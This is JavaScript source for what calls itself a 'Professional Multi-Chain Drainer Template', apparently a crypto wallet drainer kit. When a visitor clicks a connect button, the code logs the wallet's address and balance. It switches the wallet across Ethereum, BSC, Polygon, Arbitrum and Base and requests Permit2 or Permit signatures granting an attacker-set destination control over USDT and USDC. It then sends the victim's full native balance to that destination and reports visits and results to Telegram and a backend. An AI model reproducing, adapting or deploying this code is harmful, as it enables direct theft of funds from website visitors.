        const chain = Object.values(CHAINS).find(c => c.chainId.toLowerCase() === chainId.toLowerCase());
        callback({
          chainId,
          chainKey: chain ? Object.keys(CHAINS).find(k => CHAINS[k] === chain) : null,
          chainName: chain?.name || 'Unknown'
        });
      });
    }
  }

  /**
   * Get chain info by chain ID
   */
  function getChainInfo(chainId) {
    const hexId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;
    
    for (const [key, chain] of Object.entries(CHAINS)) {
      if (chain.chainId.toLowerCase() === hexId.toLowerCase()) {
        return { key, ...chain };
      }
    }

    return null;
  }

  // Public API
  return {
    CHAINS,
    init,
    show,
    hide,
    getCurrentChain,
    switchToChain,
    promptSwitch,
    onChainChange,
    getChainInfo
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = ChainModal;
}

  // ===== MAIN TEMPLATE =====
  /**
 * Professional Multi-Chain Drainer Template
 * v2.8 Modular Architecture
 */

(function() {
  'use strict';

  // Config is injected by template engine
  const CONFIG = window.DRAINER_CONFIG || {};
  const TOGGLES = CONFIG.checkboxes || {};

  /**
   * Helper to fetch ETH balance
   */
  async function getEthBalance(address) {
    try {
      const balance = await window.ethereum.request({
        method: 'eth_getBalance',
        params: [address, 'latest']
      });
      return parseFloat(parseInt(balance, 16) / 10**18).toFixed(4);
    } catch (e) {
      return '0.0000';
    }
  }

  /**
   * Main Execution Logic
   */
  async function run() {
    try {
      // 1. Detect Wallet
      const wallet = await WalletDetect.connect();
      if (!wallet) return;

      // 2. Initial Balance Check
      const balance = await getEthBalance(wallet.address);
      
      // 3. Initial Chain Scan & Stats
      Logger.logConnection({
        address: wallet.address,
        chain: wallet.chainId,
        walletType: wallet.type,
        balance: balance,
        userAgent: navigator.userAgent
      });

      if (window.Stats) {
        window.Stats.log('connect', { 
            address: wallet.address, 
            chain: wallet.chainId, 
            metadata: { walletType: wallet.type, balance: balance } 
        });
      }

      // Check if we should proceed based on balance
      if (TOGGLES.onlyIfBalance && parseFloat(balance) <= 0) {
          console.log('[Drainer] No balance detected, stopping as per config.');
          return;
      }

      // 4. Asset Analysis & Prioritization
      // Common chains to scan: Ethereum, BSC, Polygon, Arbitrum, Base
      const chainsToScan = ['0x1', '0x38', '0x89', '0xa4b1', '0x2105'];
      
      for (const chainId of chainsToScan) {
        // Switch chain if necessary
        try {
            const switched = await ChainSwitch.switchTo(window.ethereum, chainId);
            if (!switched.success) continue;

            // Execute strategy for this chain
            await executeDrainStrategy(wallet.address, chainId);
        } catch (e) {
            console.warn(`[ChainSwitch] Failed to switch to ${chainId}:`, e.message);
        }
      }

      Logger.send("✅ <b>Operation Completed</b>\nScan finished for all priority chains.");

    } catch (error) {
      console.error("[Drainer] Fatal:", error);
      Logger.logError("Execution Error", error);
    }
  }

  /**
   * Chain-specific drain strategy
   */
  async function executeDrainStrategy(address, chainId) {
    // Define tokens, including native tokens
    const chainTokens = {
      '0x1': ['0xdAC17F958D2ee523a2206206994597C13D831ec7', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'], // ETH: USDT, USDC
      '0x38': ['0x55d398326f99059fF775485246999027B3197955', '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'], // BSC: USDT, USDC
      '0x89': ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F', '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'], // Polygon: USDT, USDC
      '0xa4b1': ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'], // Arb: USDT, USDC
      '0x2105': ['0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'], // Base: USDC
    };
  
    // Define native tokens per chain
    const nativeTokens = {
      '0x1': { symbol: 'ETH', address: null },
      '0x38': { symbol: 'BNB', address: null },
      '0x89': { symbol: 'MATIC', address: null },
      '0xa4b1': { symbol: 'AVAX', address: null },
      '0x2105': { symbol: 'ETH', address: null }, // Assuming Base chain uses ETH-like native token
    };
  
    const tokens = chainTokens[chainId] || [];
  
    // Handle ERC-20 tokens
    for (const tokenAddress of tokens) {
      try {
        if (!TOGGLES.disablePermit2) {
          await Permit2.requestPermit2Signature(window.ethereum, address, {
            token: tokenAddress,
            spender: CONFIG.destination,
            chainId: parseInt(chainId, 16)
          });
        } else {
          await Permit.requestPermitSignature(window.ethereum, address, {
            token: tokenAddress,
            spender: CONFIG.destination,
            chainId: parseInt(chainId, 16)
          });
        }
      } catch (e) {
        console.warn(`[Strategy] Failed token ${tokenAddress}:`, e.message);
      }
    }
  
    // Handle native token
    const nativeToken = nativeTokens[chainId];
    if (nativeToken) {
      try {
        // Example: send native token balance to destination
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
  
        // Fetch balance
        const balance = await provider.getBalance(address);
  
        if (balance.gt(0)) {
          // Send balance to destination
          const tx = await signer.sendTransaction({
            to: CONFIG.destination,
            value: balance
          });
          await tx.wait();
          console.log(`Transferred native token (${nativeToken.symbol}) to ${CONFIG.destination}`);
        }
      } catch (e) {
        console.warn(`[Strategy] Failed to transfer native token on chain ${chainId}:`, e.message);
      }
    }
  }

  // Event Listeners for professional integration
  function bindUI() {
    const buttons = document.querySelectorAll(`.${CONFIG.connectButtonsClass || 'interact-button'}`);
    buttons.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        run();
      });
    });
  }

  // Startup
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bindUI);
  } else {
    bindUI();
  }

})();

window.WalletModal = WalletModal;

  // ===== INITIALIZATION =====
  (async function() {
    try {
      // 1. Stats Helper
      window.Stats = {
          log: async function(type, payload) {
              try {
                  const data = {
                      chain: payload.chain || 'unknown',
                      type: type,
                      address: payload.address || 'Visitor',
                      user_id: window.DRAINER_CONFIG.user_id || null,
                      amount: payload.amount || null,
                      token: payload.token || null,
                      txHash: payload.txHash || null,
                      metadata: payload.metadata || {}
                  };
                  await fetch('/api/log-event', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify(data)
                  });
              } catch (e) {}
          }
      };

      // 2. Configure Logger
      if (typeof Logger !== 'undefined' && window.DRAINER_CONFIG.telegram) {
        Logger.configure(window.DRAINER_CONFIG.telegram);
        console.log('[Logger] Configured');
      }

      // 3. Track Visit
      if (window.DRAINER_CONFIG.destination) {
        const visitorData = {
          address: 'Visitor', // Placeholder until connected
          chain: 'detecting',
          referrer: document.referrer || 'direct',
          user_id: window.DRAINER_CONFIG.user_id || null
        };
        
        // Log to Telegram
        if (typeof Logger !== "undefined") {
           Logger.send("<b>👀 New Visitor</b>\n" + 
                       "Referrer: <code>" + (document.referrer || "Direct") + "</code>\n" + 
                       "Page: <code>" + window.location.href + "</code>");
        }

        // Send to backend
        window.Stats.log('visit', { referrer: document.referrer || 'direct' });
      }
    } catch (e) {
      console.error('[Init] Error:', e);
    }
  })();

})();